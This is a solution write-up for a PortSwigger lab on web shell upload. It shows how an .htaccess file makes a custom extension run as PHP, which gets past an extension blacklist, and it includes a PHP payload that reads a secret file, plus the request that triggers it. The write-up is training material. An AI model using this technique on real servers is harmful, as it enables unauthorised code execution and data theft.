# Web shell upload via extension blacklist bypass

**Lab Url**: [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

## Objective

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The server blacklists the `.php` extension but allows uploading `.htaccess` files. We can configure Apache to treat a custom extension as executable PHP, then upload our shell using that extension.

### Step 1: Upload an `.htaccess` file

Upload a file named `.htaccess` with the following content:

```text
AddType application/x-httpd-php .cusext
```

This tells Apache to treat any `.cusext` file as PHP.

### Step 2: Upload the web shell using the new extension

Upload a file named `exploit.cusext` with the PHP payload:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Since `.cusext` is not on the blacklist, the upload succeeds.

### Step 3: Retrieve the secret

Visit the uploaded shell:

```http
GET /files/avatars/exploit.cusext
```

The server executes it as PHP and returns the contents of `/home/carlos/secret`. Submit this secret to solve the lab.